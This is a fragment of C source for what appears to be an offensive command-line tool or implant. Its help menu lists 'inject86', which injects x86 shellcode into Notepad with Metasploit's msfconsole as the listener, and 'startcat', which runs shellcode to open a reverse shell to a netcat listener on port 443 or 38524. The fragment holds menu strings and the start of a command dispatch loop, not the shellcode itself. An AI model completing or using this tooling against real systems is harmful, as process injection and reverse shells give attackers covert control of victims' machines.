...
void HelpMenu()
{
	...
	printf("\033[0;33m inject86 : \033[1;31m(x86) Injects shellcode into Notepad. [!]Set msfconsole first.\033[0m\n");
	printf("\033[0;33m startcat : \033[1;31m(x86) Executes shellcode to receive a netcat session. [!]Start netcat in listening mode first on the correct port. netcat -lvnp 443, (netcat -lvnp 38524 for fallback shell)\033[0m\n");
	printf("\n");
...
int main(int argc, char *argv[])
{
	...
	while (1)
	{
		...
		else if (strncmp(Buffer, "inject86", 8) == 0)
		{
